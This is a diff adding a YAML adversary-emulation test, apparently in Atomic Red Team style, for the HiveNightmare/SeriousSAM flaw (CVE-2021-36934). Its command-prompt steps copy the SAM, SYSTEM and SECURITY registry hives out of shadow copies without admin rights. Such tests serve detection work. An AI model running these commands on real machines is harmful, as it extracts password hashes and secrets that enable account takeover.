@@ -1,1 +1,35 @@
-hive 
+id: f4bdfd5d-fcce-4e63-b8a6-2b1a7f1e6b12
+atomics:
+  - name: HiveNightmare / SeriousSAM (CVE-2021-36934)
+    description: |
+      Exploits the HiveNightmare (SeriousSAM) vulnerability to access sensitive SAM, SYSTEM, and SECURITY registry hives as a non-admin user due to improper ACLs on Volume Shadow Copy files.
+    supported_platforms:
+      - windows
+    input_arguments:
+      output_directory:
+        description: Directory to copy registry hives to
+        type: path
+        default: "%TEMP%\\hivenightmare"
+    executor:
+      name: command_prompt
+      elevation_required: false
+      steps:
+        - name: Create output directory
+          command: mkdir "%output_directory%"
+        - name: Copy SAM hive from shadow copy
+          command: |
+            for /f "tokens=*" %i in ('wmic shadowcopy get DeviceObject ^| findstr Volume') do copy "%i\Windows\System32\config\SAM" "%output_directory%\SAM"
+        - name: Copy SYSTEM hive from shadow copy
+          command: |
+            for /f "tokens=*" %i in ('wmic shadowcopy get DeviceObject ^| findstr Volume') do copy "%i\Windows\System32\config\SYSTEM" "%output_directory%\SYSTEM"
+        - name: Copy SECURITY hive from shadow copy
+          command: |
+            for /f "tokens=*" %i in ('wmic shadowcopy get DeviceObject ^| findstr Volume') do copy "%i\Windows\System32\config\SECURITY" "%output_directory%\SECURITY"
+        - name: List contents of output directory
+          command: dir "%output_directory%"
+    cleanup_commands:
+      - rmdir /s /q "%output_directory%"
+    references:
+      - https://attack.mitre.org/techniques/T1003/002/
+      - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934
+      - https://github.com/afwu/Active-Directory-Tools/tree/master/CVE-2021-36934
